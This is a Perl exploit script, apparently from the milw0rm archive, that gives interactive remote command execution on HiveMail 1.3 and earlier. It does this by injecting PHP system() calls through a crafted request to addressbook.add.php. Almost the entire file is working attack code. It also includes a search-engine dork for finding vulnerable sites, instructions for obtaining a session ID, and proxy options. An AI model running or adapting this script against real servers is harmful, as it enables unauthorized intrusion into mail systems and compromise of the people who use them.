#!/usr/bin/perl                                     #
#                                                   #
# HiveMail <= 1.3 remote command execution exploit  #
#                                                   #
#################################################################################
#                                                                               #
# Advisory:                                                                     #
# http://www.gulftech.org/?node=research&article_id=00098-02102006              #
#                                                                               #
# To get the hivesession:                                                       #
# log on hivemail with firefox then look at the hivesession number in the url.  #
# (yes i know...)                                                               #
#                                                                               #
#################################################################################
#                                                                      #
# Dork:                                                                #
# "Already have an account?" "Enter your information below to log in." #
#                                                                      #
########################################################################
#               #
# coded by [Oo] #
#               #
#################


require LWP::UserAgent;
use URI;
use Getopt::Long;

$| = 1;  # fflush stdout after print

# Default options
# connection 
my $basic_auth_user = '';
my $basic_auth_pass = '';
my $proxy = '';
my $proxy_user = '';
my $proxy_pass = '';
my $conn_timeout = 15;

# general
my $host;
my $session;
 
 print "\n[i] HiveMail <= 1.3 remote command execution exploit\n";
 print "[i] coded by [Oo]\n";
 

 # read command line options
 my $options = GetOptions (

 #general options
 'host=s'    => \$host, # input host to test.
 'session=s'    => \$session, # input host to test.
 # connection options
 'basic_auth_user=s' => \$basic_auth_user,
 'basic_auth_pass=s' => \$basic_auth_pass,
 'proxy=s'           => \$proxy,
 'proxy_user=s'      => \$proxy_user,
 'proxy_pass=s'      => \$proxy_pass,
 'timeout=i'         => \$conn_timeout);
 
 # command line sanity check 
 &show_usage unless ($host);
 &show_usage unless ($session);
 
 # main loop 
 while (1){
 	print "\n[hivemail] ";
 	my $cmd = <STDIN>;
 	hm_xploit ($cmd);
 }

 exit (1);

#exploit 
sub hm_xploit {
  chomp (my $data = shift);
  
  if ($data eq "exit") { print "\n[e] Exit!\n";exit(); }

  my $exp = $host."addressbook.add.php?hivesession=".$session."&cmd=quick&messageid=\");echo%20\"start_er\";system(\$com);echo%20\"end_er\";\@d(\"&popid=1&com=".$data." ";
  my $req = new HTTP::Request 'GET' => $exp;
 
  
  my $ua = new LWP::UserAgent;
  $ua->timeout($conn_timeout);

  if ($basic_auth_user){
    $req->authorization_basic($basic_auth_user, $basic_auth_pass) 
  }
  if ($proxy){
    $ua->proxy(['http'] => $proxy);
    $req->proxy_authorization_basic($proxy_user, $proxy_pass);
  }

	 
  my $res = $ua->request($req);
  my $show = $res->content;
  
  print"\n";
  if ($show =~ m/start_er(.*?)end_er/ms) {
    my $out = $1;
    $out =~ s/^\s+|\s+$//gs;
    if ($out) {
      print "$out\n";
    }
  }
  
}

# show options 
sub show_usage {
  print "\n[*] Usage: ./hmail_exp.pl [options] [host] [session]\n";
  print "[*] Options:\n";
  print "\t--proxy (http), --proxy_user, --proxy_pass\n";
  print "\t--basic_auth_user, --basic_auth_pass\n";
  print "\t--timeout \n";
  print "[*] Example:\n";
  print "    hmail_exp.pl --host=http://127.0.0.1/hivemail/ --session=22ead72ecf6af376a801923466a23efa\n";
  exit(1);
}

# milw0rm.com [2006-05-06]
